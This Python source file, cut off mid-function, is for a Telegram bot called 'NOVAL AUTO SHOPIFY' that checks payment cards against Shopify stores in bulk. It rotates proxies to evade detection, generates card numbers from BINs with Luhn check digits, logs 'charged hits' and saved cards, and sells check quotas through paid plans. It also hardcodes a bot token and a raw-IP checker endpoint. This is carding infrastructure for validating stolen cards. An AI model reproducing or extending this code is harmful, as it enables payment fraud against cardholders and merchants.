# ─────────────────────────────────────────────────────────────────────────────
# NOVAL AUTO SHOPIFY — v52 (Audited · Bug-fixed · Tools tap-hint · Auth btn)
# ─────────────────────────────────────────────────────────────────────────────

import asyncio, gzip, html, io, json, logging, os, random, re, sqlite3, string, sys, threading, time, uuid, urllib.parse
from collections import defaultdict
from contextlib import contextmanager
from datetime import datetime, timezone, timedelta
from typing import Any, Dict, List, Optional

import aiohttp
from aiogram import Bot, Dispatcher, Router, F, BaseMiddleware
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart, CommandObject
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    InputMediaPhoto, InputMediaVideo, LabeledPrice, PreCheckoutQuery, BotCommand, BufferedInputFile,
)
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.exceptions import TelegramBadRequest

try:
    from aiohttp_socks import ProxyConnector
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

# ── Env & Config ─────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "9012515117:AAHBOQixNNM75viCZdk7eTEnoq8EWEUqg9E")
DB_PATH = os.getenv("DB_PATH", "bot.db")
API_STATE_PATH = os.getenv("API_STATE_PATH", "api_endpoints.json")
SITES_PATH = os.getenv("SITES_PATH", "sites.txt")
PORT = os.getenv("PORT")

OWNER_ID = 6343891623
ADMIN_IDS = [OWNER_ID]
LIMITED_ADMIN_IDS: List[int] = []
KEY_PREFIX = "NOVAL-PRO"
START_TIME = time.time()

CHECK_TIMEOUT            = 45
PROXY_CONNECT_TIMEOUT    = 10
PROXY_SOCK_READ_TIMEOUT  = 30

MASS_BATCH_SIZE_LB          = 250
MASS_BATCH_DELAY_LB         = 0.3
MASS_CONCURRENCY_LB_ADMIN   = 100
MASS_CONCURRENCY_LB_PREMIUM = 60

PROXY_TEST_TIMEOUT         = 15
PROXY_TEST_CONNECT_TIMEOUT = 10
PROXY_TEST_BATCH           = 25
PROXY_TEST_URL             = "https://api.ipify.org"
LIVE_PROXY_LIMIT           = 100
PER_PROXY_CONCURRENCY      = 4
PROXY_FAIL_THRESHOLD       = 2

DEFAULT_WORKERS_CAP = 900
ENDPOINT_FAIL_THRESHOLD = 3
ENDPOINT_COOLDOWN_SEC = 60

DUMMY_CC = "4111111111111111|12|30|123"
BOT_USERNAME = "NOVAL_AUTOSHOPI_BOT"
HIDDEN_CREDIT = "<blockquote><i>Powered by <a href='https://t.me/Senselessme'>@Senselessme</a></i></blockquote>"

RETRYABLE_CLS = {"timeout", "rate_limited", "site_error", "proxy_error", "error"}

# ── Media Assets ─────────────────────────────────────────────────────────────
VIDEOS = [
    "https://files.catbox.moe/7od2fh.mp4", "https://files.catbox.moe/ykw05n.mp4",
    "https://files.catbox.moe/6s7klz.mp4", "https://files.catbox.moe/1wt119.mp4",
    "https://files.catbox.moe/jzkofh.mp4", "https://files.catbox.moe/mxmzn7.mp4",
    "https://files.catbox.moe/5151uk.mp4"
]
IMAGES = [
    "https://files.catbox.moe/c2kzjk.jpg", "https://files.catbox.moe/lytev2.jpg",
    "https://files.catbox.moe/uky8rd.jpg", "https://files.catbox.moe/6lwbz8.jpg",
    "https://files.catbox.moe/g68i0b.jpg", "https://files.catbox.moe/cjkeeo.jpg",
    "https://files.catbox.moe/22bow8.jpg", "https://files.catbox.moe/w3sfcy.jpg",
    "https://files.catbox.moe/1zq5vj.jpg", "https://files.catbox.moe/oooo15.jpg",
    "https://files.catbox.moe/ezmqwe.jpg", "https://files.catbox.moe/ylw8v9.jpg",
    "https://files.catbox.moe/3xlvuu.jpg"
]
IMG_MAIN = IMAGES[0]

BACKUP_CHUNK_SIZE  = 18 * 1024 * 1024
BACKUP_SESSION_TTL = 3600
_restore_sessions = {}
_restore_lock = threading.RLock()

DEFAULT_API_STATE = {
    "version": 5,
    "endpoints": [
        {"url": "http://107.148.78.54:8083/shopify", "style": "raw", "cap": 900, "enabled": True, "key": None, "site_required": False},
    ],
    "active_idx": 0,
}
DEFAULT_SITES: List[str] = []
TELEGRAM_PROXY = None

PLANS = {
    "free": {"name": "Free Trial", "limit": 1000, "mass_limit": 100},
    "pro": {"name": "Pro", "limit": 5000, "mass_limit": 2000},
    "premium": {"name": "Premium", "limit": 10000, "mass_limit": 5000},
    "max": {"name": "Max", "limit": 30000, "mass_limit": 10000},
    "unlimited": {"name": "Unlimited", "limit": 999999, "mass_limit": 20000},
}
STAR_PRODUCTS = {
    "star_premium": {"plan": "premium", "stars": 200, "days": 30, "label": "Premium — 30 Days"},
    "star_max": {"plan": "max", "stars": 500, "days": 30, "label": "MAX — 30 Days"},
    "star_unlimited": {"plan": "unlimited", "stars": 800, "days": 30, "label": "Unlimited — 30 Days"},
}

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s", stream=sys.stderr)
log = logging.getLogger("noval")

EMOJI = {"settings":"5877260593903177342","back":"5875082500023258804","forward":"5832251986635920010","user":"5879770735999717115","pen":"5839380580080293813","docs":"5877301185639091664","trash":"5879915802815107172","unlock":"5886505193180239900","star":"5839116473951328489","chat":"5793933761594789855","help":"5897846616966041652","tools":"5988023995125993550","stop":"5870734657384877785","add":"5920090136627908485","shop":"5983399041197675256","gem":"5778546023349621090","gem2":"5963312935148195483","gem3":"6028530359975548369","chat2":"5985617073978481575","cross1":"5985346521103604145","up":"6030861234432121355","num1":"5794182096603847292","pen2":"5985774024968379294","loading":"6258124820400049944","infinity":"6258154670422757760","heart":"6257853292567597091","percent":"6258071055999438126","warn_red":"6257858798715670989","chart":"6258267877170745815","check":"6258098853027778582","online":"6260192112713666900","gem4":"6260181985180782013","up_tri":"6262482227930598980","diamond":"6260156752247918115","refresh":"6260297232038235681","check2":"6262671743362535108","diamond2":"6260308957298954089","green_sq":"6260565633134498058","down_tri":"6260486601441284439","ghost":"6282819035516113016","cross2":"6282852025159913806","check3":"6280338743442280499","hourglass":"6280443553529204094","glow_star":"6280674670014369924","smile":"6282811871510662984","upside":"6282622386143498738","warn":"6206077285720659346","warn2":"6206174450765796040","link":"6206497372176913599","book":"6206112371308500200","pill":"6206378324273403309","bell":"6206508629286196237","red_x":"6206110936789423908"}

def pbtn(text, *, icon="star", color="primary", callback_data=None, url=None):
    """
    aiogram 3 does NOT support icon_custom_emoji_id or style on InlineKeyboardButton.
    Previous version silently fell back to plain buttons every single call.
    This version builds plain buttons directly — same visual result, no silent failure.
    Premium emoji styling lives in MESSAGE text via <tg-emoji>, not on buttons.
    """
    return InlineKeyboardButton(text=text, callback_data=callback_data, url=url)

def pe(name): return f'<tg-emoji emoji-id="{EMOJI.get(name, EMOJI["star"])}">👑</tg-emoji>'
def esc(text): return html.escape(str(text) if text is not None else "")

_SC_MAP = {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ'}
def sc(text: str) -> str: return "".join(_SC_MAP.get(ch.lower(), ch) for ch in str(text))

def owner_link(): return f'<a href="https://t.me/Senselessme">@Senselessme</a>'
def channel_link(): return f'<a href="https://t.me/NovalNetwork">@NovalNetwork</a>'

_URL_RE      = re.compile(r"https?://[^\s'\"<>]+", re.IGNORECASE)
_IP_PORT_RE  = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}(?::\d{1,5})?\b")
_HOST_PORT_RE = re.compile(r"\b[a-zA-Z0-9][a-zA-Z0-9\-\.]{1,}\.[a-zA-Z]{2,}(?::\d{1,5})?\b")
def _sanitize_err(msg) -> str:
    if not msg: return ""
    s = str(msg)
    s = _URL_RE.sub("[redacted]", s)
    s = _IP_PORT_RE.sub("[redacted]", s)
    s = _HOST_PORT_RE.sub("[redacted]", s)
    return s[:200]

def _user_link(uid: int, username: str = "") -> str:
    if not uid: return sc("GOKU")
    if username: return f'<a href="https://t.me/{esc(username.lstrip("@"))}">{esc(username)}</a>'
    return f'<a href="tg://user?id={uid}">User {uid}</a>'

def get_check_cooldown() -> int: return int(get_setting("cooldown_sec", "1"))

_state_lock = threading.RLock()
_sites_cache: List[str] = []
_sites_loaded = False

def _atomic_write(path: str, data: str) -> None:
    tmp = f"{path}.tmp"
    with open(tmp, "w", encoding="utf-8") as f: f.write(data)
    os.replace(tmp, path)

def _migrate_api_state(st: Dict[str, Any]) -> Dict[str, Any]:
    ver = int(st.get("version", 1) or 1)
    if ver < 5:
        existing = {e.get("url", "") for e in st.get("endpoints", [])}
        for ep in DEFAULT_API_STATE["endpoints"]:
            if ep["url"] not in existing: st.setdefault("endpoints", []).append(dict(ep))
        st["version"] = 5
    for ep in st.get("endpoints", []):
        ep.setdefault("style", "params"); ep.setdefault("cap", DEFAULT_WORKERS_CAP); ep.setdefault("enabled", True); ep.setdefault("key", None)
        if "site_required" not in ep: ep["site_required"] = (ep.get("style") == "params")
    st.setdefault("active_idx", 0)
    return st

def load_api_state() -> Dict[str, Any]:
    with _state_lock:
        try:
            with open(API_STATE_PATH, "r", encoding="utf-8") as f: st = json.load(f)
            if not isinstance(st.get("endpoints"), list): raise ValueError("bad state")
            return _migrate_api_state(st)
        except Exception:
            _atomic_write(API_STATE_PATH, json.dumps(DEFAULT_API_STATE, indent=2))
            return json.loads(json.dumps(DEFAULT_API_STATE))

def save_api_state(st: Dict[str, Any]) -> None:
    with _state_lock: _atomic_write(API_STATE_PATH, json.dumps(st, indent=2))

def _filtered_endpoints() -> List[Dict[str, Any]]:
    mode = get_setting("site_mode", "auto")
    st = load_api_state()
    eps = [e for e in st.get("endpoints", []) if e.get("enabled", True) and e.get("url")]
    if mode == "siteless": eps = [e for e in eps if not e.get("site_required", False)]
    elif mode == "with_site": eps = [e for e in eps if e.get("site_required", False)]
    return eps

def endpoints_need_sites() -> bool:
    eps = _filtered_endpoints()
    if not eps: return False
    return all(e.get("site_required", False) for e in eps)

def mode_label() -> str:
    m = get_setting("site_mode", "auto")
    if m == "siteless": return "SITELESS"
    if m == "with_site": return "WITH-SITE"
    return "AUTO"

_endpoint_rr = 0
_endpoint_rr_lock = threading.Lock()
_endpoint_fail_counts: Dict[str, int] = {}
_endpoint_fail_ts:    Dict[str, float] = {}

def mark_endpoint_fail(url: str):
    _endpoint_fail_counts[url] = _endpoint_fail_counts.get(url, 0) + 1
    if _endpoint_fail_counts[url] >= ENDPOINT_FAIL_THRESHOLD: _endpoint_fail_ts[url] = time.time()

def mark_endpoint_ok(url: str):
    _endpoint_fail_counts.pop(url, None)
    _endpoint_fail_ts.pop(url, None)

def is_endpoint_down(url: str) -> bool:
    ts = _endpoint_fail_ts.get(url, 0)
    if ts and time.time() - ts < ENDPOINT_COOLDOWN_SEC: return True
    if ts: _endpoint_fail_ts.pop(url, None); _endpoint_fail_counts.pop(url, None)
    return False

def load_sites() -> List[str]:
    global _sites_cache, _sites_loaded
    with _state_lock:
        if _sites_loaded: return list(_sites_cache)
        try:
            with open(SITES_PATH, "r", encoding="utf-8") as f: _sites_cache = [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            _sites_cache = list(DEFAULT_SITES)
            _atomic_write(SITES_PATH, "")
        _sites_loaded = True
        return list(_sites_cache)

# DB
_db_conn: Optional[sqlite3.Connection] = None
_db_lock = threading.RLock()
_db_write_lock: Optional[asyncio.Lock] = None

def _get_write_lock() -> asyncio.Lock:
    global _db_write_lock
    if _db_write_lock is None: _db_write_lock = asyncio.Lock()
    return _db_write_lock

def _get_conn() -> sqlite3.Connection:
    global _db_conn
    if _db_conn is None:
        _db_conn = sqlite3.connect(DB_PATH, timeout=60, check_same_thread=False)
        _db_conn.row_factory = sqlite3.Row
        _db_conn.execute("PRAGMA journal_mode=WAL")
        _db_conn.execute("PRAGMA synchronous=NORMAL")
        _db_conn.execute("PRAGMA busy_timeout=60000")
    return _db_conn

def reset_db_conn():
    global _db_conn
    with _db_lock:
        if _db_conn:
            try: _db_conn.close()
            except: pass
            _db_conn = None
    return _get_conn()

@contextmanager
def db():
    conn = _get_conn()
    with _db_lock:
        try:
            yield conn
            conn.commit()
        except Exception:
            conn.rollback()
            raise

def init_db() -> None:
    with db() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            uid INTEGER PRIMARY KEY, username TEXT DEFAULT '', plan TEXT DEFAULT 'free',
            premium_until TEXT DEFAULT '', daily_checks INTEGER DEFAULT 0,
            last_check_date TEXT DEFAULT '', credits INTEGER DEFAULT 50,
            last_credit_date TEXT DEFAULT '', trial_last_used TEXT DEFAULT '',
            awaiting TEXT DEFAULT '', banned INTEGER DEFAULT 0, ban_reason TEXT DEFAULT '',
            refer_count INTEGER DEFAULT 0, referred_by INTEGER DEFAULT 0, streak INTEGER DEFAULT 0,
            last_streak_date TEXT DEFAULT '', total_checks INTEGER DEFAULT 0,
            total_hits INTEGER DEFAULT 0, last_seen TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
        CREATE TABLE IF NOT EXISTS redeem_codes (code TEXT PRIMARY KEY, plan TEXT, max_uses INTEGER, used INTEGER DEFAULT 0, days INTEGER DEFAULT 30);
        CREATE TABLE IF NOT EXISTS redeem_log (id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, uid INTEGER, used_at TEXT, UNIQUE(code, uid));
        CREATE TABLE IF NOT EXISTS check_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, cc TEXT, response TEXT, status TEXT, gateway TEXT, ts TEXT);
        CREATE TABLE IF NOT EXISTS saved_cards (id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, cc TEXT, saved_at TEXT, UNIQUE(uid, cc));
        CREATE TABLE IF NOT EXISTS bin_cache (bin TEXT PRIMARY KEY, data TEXT, ts TEXT);
        CREATE TABLE IF NOT EXISTS user_proxies (
            id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, proxy TEXT,
            status TEXT DEFAULT 'unknown', latency REAL DEFAULT 0,
            checked_at TEXT DEFAULT '', UNIQUE(uid, proxy)
        );
        CREATE TABLE IF NOT EXISTS sites (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT UNIQUE);
        CREATE TABLE IF NOT EXISTS force_channels (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id TEXT UNIQUE, title TEXT DEFAULT '', chat_type TEXT DEFAULT 'channel',
            invite_link TEXT DEFAULT '', enabled INTEGER DEFAULT 1, added_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS charged_hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cc TEXT, site TEXT, response TEXT,
            amount REAL DEFAULT 0, currency TEXT DEFAULT 'USD',
            uid INTEGER DEFAULT 0, ts TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS feedback (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid INTEGER, username TEXT, msg_type TEXT, text TEXT, file_id TEXT, ts TEXT
        );
        """)
        for k, v in [
            ("maintenance", "0"), ("hit_log_channel", ""), ("auto_post_chat", ""), ("charged_gc_id", ""),
            ("charged_gc_name", ""), ("public_gc_id", ""), ("fb_channel_id", ""), ("site_max_price", "3.0"),
            ("site_health", "{}"), ("extra_admins", ""), ("limited_admins", ""), ("pvt_file_gc_id", ""),
            ("pvt_file_gc_name", ""), ("pvt_cc_gc_id", ""), ("pvt_cc_gc_name", ""), ("site_mode", "auto"),
            ("daily_credits", "50"), ("gen_limit", "10"), ("bot_name", "NOVAL AUTO SHOPIFY"), ("support_link", "https://t.me/Senselessme"),
            ("wallet_usdt", "Enter USDT Address"), ("wallet_ton", "Enter TON Address"),
            ("asset_IMG_MAIN", IMG_MAIN), ("asset_VID_MAIN", ""),
            ("cooldown_sec", "1"), ("price_weekly", "10"), ("price_monthly", "30"), ("trial_hours", "3"),
            ("proxy_required", "0"), ("anti_spam_limit", "5"), ("support_enabled", "1"), ("max_retries", "3"),
            ("force_sub_enabled", "1")  # FIX: was never seeded, check_force_sub returned default by luck
        ]: c.execute("INSERT OR IGNORE INTO settings(key, value) VALUES (?,?)", (k, v))

def get_setting(key, default=""):
    try:
        with db() as c:
            r = c.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
            return r["value"] if r else default
    except: return default

def set_setting(key, value):
    with db() as c: c.execute("INSERT INTO settings(key,value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key, str(value)))

def load_extra_admins():
    try:
        stored = get_setting("extra_admins", "")
        if stored:
            for x in stored.split(","):
                if x.strip().isdigit() and int(x) not in ADMIN_IDS: ADMIN_IDS.append(int(x))
        lst = get_setting("limited_admins", "")
        if lst:
            for x in lst.split(","):
                if x.strip().isdigit() and int(x) not in LIMITED_ADMIN_IDS: LIMITED_ADMIN_IDS.append(int(x))
    except: pass

def save_extra_admins():
    try:
        set_setting("extra_admins", ",".join(str(x) for x in ADMIN_IDS if x != OWNER_ID))
        set_setting("limited_admins", ",".join(str(x) for x in LIMITED_ADMIN_IDS))
    except: pass

def get_user(uid):
    try:
        with db() as c: return c.execute("SELECT * FROM users WHERE uid=?", (uid,)).fetchone()
    except: return None

def ensure_user(uid, username=""):
    try:
        with db() as c:
            row = c.execute("SELECT uid FROM users WHERE uid=?", (uid,)).fetchone()
            today, now = datetime.now(timezone.utc).date().isoformat(), datetime.now(timezone.utc).isoformat()
            if not row: c.execute("INSERT OR IGNORE INTO users(uid, username, last_credit_date, last_check_date, last_seen) VALUES (?,?,?,?,?)", (uid, username or "", today, today, now))
            else: c.execute("UPDATE users SET username=?, last_seen=? WHERE uid=?", (username or "", now, uid))
    except Exception as e: log.warning(f"ensure_user: {e}")

def get_user_or_create(uid, username=""):
    ensure_user(uid, username)
    return get_user(uid)

def set_awaiting(uid, state):
    ensure_user(uid)
    with db() as c: c.execute("UPDATE users SET awaiting=? WHERE uid=?", (state, uid))

def get_awaiting(uid):
    u = get_user(uid)
    return u["awaiting"] if u else ""

def is_full_admin(uid): return uid in ADMIN_IDS
def is_limited_admin(uid): return uid in LIMITED_ADMIN_IDS
def is_admin(uid): return is_full_admin(uid) or is_limited_admin(uid)

def plan_of(uid):
    u = get_user(uid)
    return u["plan"] if u and u["plan"] in PLANS else "free"

def upgrade_user(uid, plan_name, days=30):
    if plan_name not in PLANS: return
    ensure_user(uid)
    exp = "" if plan_name == "unlimited" else (datetime.now(timezone.utc) + timedelta(days=days)).isoformat()
    with db() as c: c.execute("UPDATE users SET plan=?, premium_until=? WHERE uid=?", (plan_name, exp, uid))

class EnsureUserMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        try:
            u = data.get("event_from_user")
            if u and not getattr(u, "is_bot", False): ensure_user(u.id, u.username or "")
        except: pass
        return await handler(event, data)

_sites_cache2 = None
_sites_cache_ts = 0

def _invalidate_sites():
    global _sites_cache, _sites_cache2, _sites_cache_ts, _sites_loaded
    _sites_cache, _sites_cache2, _sites_cache_ts, _sites_loaded = [], None, 0, False

def get_sites() -> List[str]:
    global _sites_cache2, _sites_cache_ts
    now = time.time()
    if _sites_cache2 is not None and (now - _sites_cache_ts) < 30: return _sites_cache2
    try:
        with db() as c: _sites_cache2 = [r["url"] for r in c.execute("SELECT url FROM sites ORDER BY id").fetchall()]
    except: _sites_cache2 = []
    _sites_cache_ts = now
    return _sites_cache2

def add_site_db(url: str) -> bool:
    url = url.strip().lower()
    if url.startswith("https://"): url = url[8:]
    elif url.startswith("http://"): url = url[7:]
    url = url.split("/")[0]
    if not url: return False
    with db() as c: c.execute("INSERT OR IGNORE INTO sites(url) VALUES (?)", (url,))
    _invalidate_sites()
    return True

def remove_site_db(url: str):
    with db() as c: c.execute("DELETE FROM sites WHERE url=?", (url,))
    _invalidate_sites()

def force_channels_list(enabled_only=False):
    with db() as c:
        q = "SELECT * FROM force_channels"
        if enabled_only: q += " WHERE enabled=1"
        return c.execute(q).fetchall()

def add_force_channel(chat_id: str, title: str = "", chat_type: str = "channel", invite_link: str = ""):
    with db() as c: c.execute("INSERT OR REPLACE INTO force_channels(chat_id, title, chat_type, invite_link, enabled, added_at) VALUES (?, ?, ?, ?, 1, ?)", (str(chat_id), title, chat_type, invite_link, datetime.now(timezone.utc).isoformat()))

def remove_force_channel(chat_id: str):
    with db() as c: c.execute("DELETE FROM force_channels WHERE chat_id=?", (str(chat_id),))

def toggle_force_channel(chat_id: str):
    with db() as c:
        row = c.execute("SELECT enabled FROM force_channels WHERE chat_id=?", (str(chat_id),)).fetchone()
        if row:
            new = 0 if row["enabled"] else 1
            c.execute("UPDATE force_channels SET enabled=? WHERE chat_id=?", (new, str(chat_id)))
            return new
    return 0

async def check_force_sub(bot, uid):
    if is_admin(uid): return True
    if get_setting("force_sub_enabled", "1") != "1": return True
    for ch in force_channels_list(enabled_only=True):
        try:
            m = await bot.get_chat_member(ch["chat_id"], uid)
            if m.status in ("left", "kicked"): return False
        except: pass
    return True

_site_fail_count: Dict[str, int] = {}
_site_cooldown_until: Dict[str, float] = {}
SITE_MIN_GAP = 1.0
_site_last_hit: Dict[str, float] = {}
_site_locks: Dict[str, asyncio.Lock] = {}

async def acquire_site_slot(site: str):
    if not site: return
    lock = _site_locks.setdefault(site, asyncio.Lock())
    async with lock:
        wait = SITE_MIN_GAP - (time.time() - _site_last_hit.get(site, 0))
        if wait > 0: await asyncio.sleep(wait)
        _site_last_hit[site] = time.time()

def _is_site_benched(site): return time.time() < _site_cooldown_until.get(site, 0)
def _bench_site(site, seconds=120): _site_cooldown_until[site] = time.time() + seconds

def _pick_random_sites(n=3):
    sites = get_sites()
    if not sites: return []
    healthy = [s for s in sites if not _is_site_benched(s)]
    pool = healthy if healthy else list(sites)
    random.shuffle(pool)
    return pool[:n]

_mass_tasks = {}
_pending_mass: Dict[str, Dict[str, Any]] = {}

def _cleanup_pending_mass():
    now = time.time()
    for k in [k for k, v in _pending_mass.items() if now - v.get("ts", 0) > 3600]: _pending_mass.pop(k, None)

CC_REGEX = re.compile(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")

def normalize_cc(raw):
    if not raw: return None
    s = re.sub(r"[\s:;,/\-]+", "|", raw.strip())
    parts = [p for p in s.split("|") if p]
    if len(parts) != 4: return None
    num, mm, yy, cvv = (re.sub(r"\D", "", x) for x in parts)
    if not (num and mm and yy and cvv) or not (13 <= len(num) <= 19): return None
    if len(yy) == 4: yy = yy[2:]
    cc = f"{num}|{mm.zfill(2)[:2]}|{yy.zfill(2)[:2]}|{cvv.zfill(3)[:4]}"
    return cc if CC_REGEX.match(cc) else None

def country_flag(code):
    if not code or len(code) != 2 or not code.isalpha(): return "🌍"
    return chr(0x1F1E6 + ord(code[0].upper()) - 65) + chr(0x1F1E6 + ord(code[1].upper()) - 65)

def luhn_check_digit(partial):
    for d in "0123456789":
        if luhn_ok(partial + d): return d
    return "0"

def luhn_ok(card):
    if not card.isdigit(): return False
    total, rev = 0, card[::-1]
    for i, ch in enumerate(rev):
        d = ord(ch) - 48
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        total += d
    return total % 10 == 0

def brand_pe(cc):
    if cc.startswith('4'): return f"{pe('gem')} ᴠɪꜱᴀ"
    if cc.startswith('5'): return f"{pe('gem2')} ᴍᴀꜱᴛᴇʀ"
    if cc.startswith(('34','37')): return f"{pe('gem3')} ᴀᴍᴇx"
    return f"{pe('gem4')} ᴅɪꜱᴄ"

def generate_custom_cc(pattern: str, count: int = 10) -> List[str]:
    cards = []
    for _ in range(count):
        cc = pattern
        cc = re.sub(r'[xX]', lambda _: random.choice(string.digits), cc)
        parts = cc.split('|')
        if len(parts) != 4: continue
        num, mm, yy, cvv = parts
        if len(num) < 13 or len(num) > 19: continue
        if len(mm) < 1 or len(mm) > 2: continue
        if len(yy) < 2 or len(yy) > 4: continue
        if len(cvv) < 3 or len(cvv) > 4: continue
        mm = mm.zfill(2)
        if len(yy) == 2: yy = yy.zfill(2)
        elif len(yy) == 4: yy = yy[2:]
        if len(num) == 15: num += luhn_check_digit(num)
        final_card = f"{num}|{mm}|{yy}|{cvv}"
        if CC_REGEX.match(final_card): cards.append(final_card)
    return cards

def generate_cc(bin_prefix, count=10):
    pattern = f"{bin_prefix}{'x' * (16 - len(bin_prefix))}|12|30|123"
    return generate_custom_cc(pattern, count)

_proxy_sems: Dict[str, asyncio.Semaphore] = {}
_proxy_fail_streak: Dict[str, int] = defaultdict(int)
_dead_proxies_run: set = set()
_rotation_counters: Dict[int, int] = {}
_rotation_lock = threading.Lock()

def rotate_proxy(uid: int, proxies: List[str]) -> Optional[str]:
    if not proxies: return None
    with _rotation_lock:
        i = _rotation_counters.get(uid, 0)
        _rotation_counters[uid] = i + 1
    return proxies[i % len(proxies)]

def proxy_sem(proxy: str) -> asyncio.Semaphore:
    if proxy not in _proxy_sems: _proxy_sems[proxy] = asyncio.Semaphore(PER_PROXY_CONCURRENCY)
    return _proxy_sems[proxy]

def mark_proxy_ok(proxy: str):
    if proxy: _proxy_fail_streak.pop(proxy, None)

def mark_proxy_fail(proxy: str) -> bool:
    if not proxy: return False
    _proxy_fail_streak[proxy] += 1
    if _proxy_fail_streak[proxy] >= PROXY_FAIL_THRESHOLD:
        _dead_proxies_run.add(proxy)
        return True
    return False

def normalize_proxy(line: str) -> Optional[str]:
    if not line: return None
    p = line.strip()
    if not p or p.startswith("#") or p.startswith("//"): return None
    scheme = "http"
    if p.startswith("socks5://"): scheme = "socks5"; p = p[9:]
    elif p.startswith("socks4://"): scheme = "socks4"; p = p[9:]
    elif p.startswith("http://"): scheme = "http"; p = p[7:]
    elif p.startswith("https://"): scheme = "https"; p = p[8:]
    if "@" in p:
        auth, hostport = p.split("@", 1)
        if ":" not in auth or ":" not in hostport: return None
        user, pw = auth.split(":", 1)
        host, port = hostport.rsplit(":", 1)
        return f"{scheme}://{user}:{pw}@{host}:{port}"
    parts = p.split(":")
    if len(parts) == 4: return f"{scheme}://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2: return f"{scheme}://{parts[0]}:{parts[1]}"
    return None

def _proxy_to_url(p: str) -> str:
    if "://" in p: return p
    parts = p.split(":")
    return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}" if len(parts) == 4 else f"http://{p}"

def user_proxy_list(uid):
    with db() as c: return [r["proxy"] for r in c.execute("SELECT proxy FROM user_proxies WHERE uid=? AND status='live' ORDER BY id", (uid,)).fetchall()]

def user_proxy_all(uid):
    with db() as c: return c.execute("SELECT * FROM user_proxies WHERE uid=? ORDER BY id DESC", (uid,)).fetchall()

def clear_user_proxies(uid):
    with db() as c: c.execute("DELETE FROM user_proxies WHERE uid=?", (uid,))

def remove_user_proxy(uid: int, proxy: str):
    with db() as c: c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?", (uid, proxy))

def proxy_display(proxy: str) -> str:
    if "@" in proxy and "://" in proxy:
        try:
            scheme, rest = proxy.split("://", 1)
            if "@" in rest: return f"{scheme}://***:***@{rest.rsplit('@', 1)[1]}"
        except: pass
    return proxy[:60]

async def check_proxy_live(proxy: str) -> Dict[str, Any]:
    start = time.time()
    proxy_url = _proxy_to_url(proxy)
    try:
        is_socks = proxy_url.startswith(("socks5://", "socks5h://", "socks4://"))
        if is_socks:
            if not HAS_SOCKS: return {"ok": False, "latency": 0, "error": "aiohttp_socks missing"}
            connector = ProxyConnector.from_url(proxy_url)
        else:
            connector = aiohttp.TCPConnector(force_close=True, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(PROXY_TEST_URL, proxy=None if is_socks else proxy_url, timeout=aiohttp.ClientTimeout(total=PROXY_TEST_TIMEOUT)) as r:
                if r.status == 200:
                    txt = await r.text(errors="ignore")
                    if txt and any(c.isdigit() for c in txt): return {"ok": True, "latency": round(time.time() - start, 2)}
                    return {"ok": False, "latency": round(time.time() - start, 2), "error": "bad body"}
                return {"ok": False, "latency": round(time.time() - start, 2), "error": f"HTTP {r.status}"}
    except asyncio.TimeoutError: return {"ok": False, "latency": round(time.time() - start, 2), "error": "Timeout"}
    except Exception as e: return {"ok": False, "latency": round(time.time() - start, 2), "error": _sanitize_err(str(e)[:80])}

async def check_proxy_hq(proxy: str) -> Dict[str, Any]:
    r = await check_proxy_live(proxy)
    return {"ok": r.get("ok"), "latency": r.get("latency", 0), "error": r.get("error", "")}

def parse_proxy_txt(raw: str) -> List[str]:
    if not raw: return []
    out, seen = [], set()
    for t in re.split(r"[\r\n,;\t]+", raw):
        t = t.strip()
        if len(t) < 6: continue
        n = normalize_proxy(t)
        if n and n not in seen: seen.add(n); out.append(n)
    return out

async def preflight_proxies(uid: int, proxies: List[str]) -> Dict[str, Any]:
    result = {"tested": 0, "live": [], "dead": [], "total": len(proxies), "latencies": {}}
    if not proxies: return result
    sem, lock = asyncio.Semaphore(PROXY_TEST_BATCH), asyncio.Lock()
    async def one(p: str):
        async with sem:
            res = await check_proxy_hq(p)
            async with lock:
                result["tested"] += 1
                if res.get("ok"): result["live"].append(p); result["latencies"][p] = res.get("latency", 0)
                else: result["dead"].append(p)
    await asyncio.gather(*(one(p) for p in proxies))
    if result["dead"]:
        with db() as c:
            for p in result["dead"]: c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?", (uid, p))
    if result["live"]:
        now = datetime.now(timezone.utc).isoformat()
        with db() as c:
